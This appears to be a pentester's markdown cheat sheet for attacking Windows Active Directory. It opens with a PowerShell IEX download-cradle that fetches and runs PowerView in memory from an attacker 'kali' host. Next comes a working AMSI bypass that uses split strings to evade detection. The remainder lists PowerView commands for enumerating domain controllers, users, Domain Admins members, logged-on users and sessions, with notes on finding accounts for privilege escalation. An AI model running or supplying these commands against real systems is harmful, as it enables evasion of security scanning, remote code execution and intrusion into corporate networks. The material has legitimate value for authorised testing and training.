




- Load powershell fileless module from Kali into powershell session 
    -

```ps
    IEX(new-object System.Net.Webclient).Downloadstring("[http://kali/powerview.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1)")
```

- Bypass AMSI 

    -
```ps
$class = [Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils')
$field = $class.GetField('amsi'+'InitFailed', 'NonPublic,Static')
$field.setValue($null, $true)
```

- [PowerView](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview)
  - [github](github)
  - Get-DomainController
  - Get-DomainComputer
    - | select samaccountname, name
  - Get-DomainUsers
    - | select name, memberof
  - Get-DomainGroups
    - | select name, member
  - Get-DomainGroupMembers -identity "Domain Admins" -recurse
  - Get-DomainUser -Identity jess
  - Get-NetLoggedon
    - run local shows users who have logged onto this system (mimikatz hashes)
      - is there an account that will give me more priveleges? If not, stop.
    - run on DC requires the account to have local admin
  - Get-NetSession will show you active connections on a computer
    - run on DC requires additional services running and reg entries
  - Invoke-UserHunt
